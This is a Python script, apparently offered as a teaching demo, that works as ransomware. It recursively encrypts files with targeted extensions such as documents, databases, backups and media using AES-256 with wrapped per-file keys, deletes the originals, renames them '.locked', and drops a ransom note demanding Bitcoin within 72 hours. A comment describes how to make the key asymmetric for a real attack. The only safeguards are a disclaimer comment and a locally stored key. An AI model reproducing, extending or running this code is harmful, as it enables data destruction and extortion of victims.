# ONLY run against a sandbox folder. this is a teaching model, not a weapon.
#Am not responsible for any misuse
import os
import sys
import json
import time
import struct
import secrets
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

MAGIC = b"RNSMDEMO"           # 8 bytes
TARGET_EXTS = {
    ".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xls", ".xlsx",
    ".ppt", ".pptx", ".csv", ".md", ".json", ".xml", ".zip", ".rar",
    ".sql", ".db", ".bak", ".psd", ".mp4", ".mov",
}


#crypto primitives
def aes_encrypt(key: bytes, iv: bytes, plain: bytes) -> bytes:
    """AES-256-CBC with PKCS7 padding."""
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plain) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return enc.update(padded) + enc.finalize()


def aes_decrypt(key: bytes, iv: bytes, cipher: bytes) -> bytes:
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    padded = dec.update(cipher) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


#key management
def generate_keys() -> dict:
    """
    master key wraps per-file keys.
    in a real build: master is RSA-wrapped with an operator pubkey,
    privkey stays server-side. that asymmetry is the whole game.
    """
    return {
        "master": secrets.token_bytes(32),   # AES-256 key
        "iv":     secrets.token_bytes(16),   # master IV for wrapping
    }


#file targeting
def is_target(p: Path) -> bool:
    return p.suffix.lower() in TARGET_EXTS


#ransom note
def drop_note(directory: Path, victim_id: str) -> None:
    note = directory / "READ_ME_TO_RECOVER.txt"
    note.write_text(
        "your files have been encrypted.\n\n"
        f"victim id: {victim_id}\n\n"
        "send 0.0 BTC to the demo wallet and mail this id to recover@example.invalid\n"
        "you have 72 hours.\n",
        encoding="utf-8",
    )


#encryption routine
def encrypt_file(path: Path, keys: dict) -> bool:
    """
    layout: [8B magic][16B file IV][4B wrapped-len][wrapped file key][ciphertext]
    per-file key means identical plaintexts never produce identical ciphertexts.
    """
    try:
        plain = path.read_bytes()
    except OSError:
        return False

    file_key = secrets.token_bytes(32)     # fresh per file
    file_iv  = secrets.token_bytes(16)

    cipher = aes_encrypt(file_key, file_iv, plain)

    # wrap the per-file key with the master key
    wrapped = aes_encrypt(keys["master"], keys["iv"], file_key)

    blob = (
        MAGIC +
        file_iv +
        struct.pack("<I", len(wrapped)) +
        wrapped +
        cipher
    )

    locked = path.with_name(path.name + ".locked")
    try:
        locked.write_bytes(blob)
        path.unlink()                       # remove original
    except OSError:
        return False
    return True


def encrypt_tree(root: Path, keys: dict) -> int:
    count = 0
    for p in root.rglob("*"):
        if not p.is_file():
            continue
        if not is_target(p):
            continue
        if encrypt_file(p, keys):
            count += 1
    return count


#decryptor
def decrypt_file(path: Path, keys: dict) -> bool:
    try:
        blob = path.read_bytes()
    except OSError:
        return False

    if len(blob) < 8 + 16 + 4 or blob[:8] != MAGIC:
        return False

    file_iv = blob[8:24]
    (wlen,) = struct.unpack("<I", blob[24:28])
    wrapped = blob[28:28 + wlen]
    cipher  = blob[28 + wlen:]

    try:
        file_key = aes_decrypt(keys["master"], keys["iv"], wrapped)
        plain    = aes_decrypt(file_key, file_iv, cipher)
    except Exception:
        return False

    out = path.with_name(path.name[:-len(".locked")]) if path.name.endswith(".locked") else path
    try:
        out.write_bytes(plain)
        path.unlink()
    except OSError:
        return False
    return True


def decrypt_tree(root: Path, keys: dict) -> int:
    count = 0
    for p in root.rglob("*.locked"):
        if p.is_file() and decrypt_file(p, keys):
            count += 1
    return count


#main
def main(argv: list[str]) -> int:
    if len(argv) < 3 or argv[1] not in ("encrypt", "decrypt"):
        print("usage: ransom_demo.py <encrypt|decrypt> <sandbox_dir>")
        return 1

    mode = argv[1]
    root = Path(argv[2]).resolve()
    if not root.is_dir():
        print(f"not a directory: {root}")
        return 1

    # demo keys are persisted so encrypt/decrypt runs can talk to each other.
    keyfile = root / ".demo_keys.json"
    if mode == "encrypt":
        keys = generate_keys()
        keyfile.write_text(json.dumps({
            "master": keys["master"].hex(),
            "iv":     keys["iv"].hex(),
        }))
        n = encrypt_tree(root, keys)
        victim_id = f"demo-{int(time.time())}"
        drop_note(root, victim_id)
        print(f"encrypted {n} file(s). victim id: {victim_id}")
    else:
        if not keyfile.exists():
            print("no demo keyfile found — cannot decrypt")
            return 1
        kd = json.loads(keyfile.read_text())
        keys = {
            "master": bytes.fromhex(kd["master"]),
            "iv":     bytes.fromhex(kd["iv"]),
        }
        n = decrypt_tree(root, keys)
        print(f"decrypted {n} file(s).")

    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
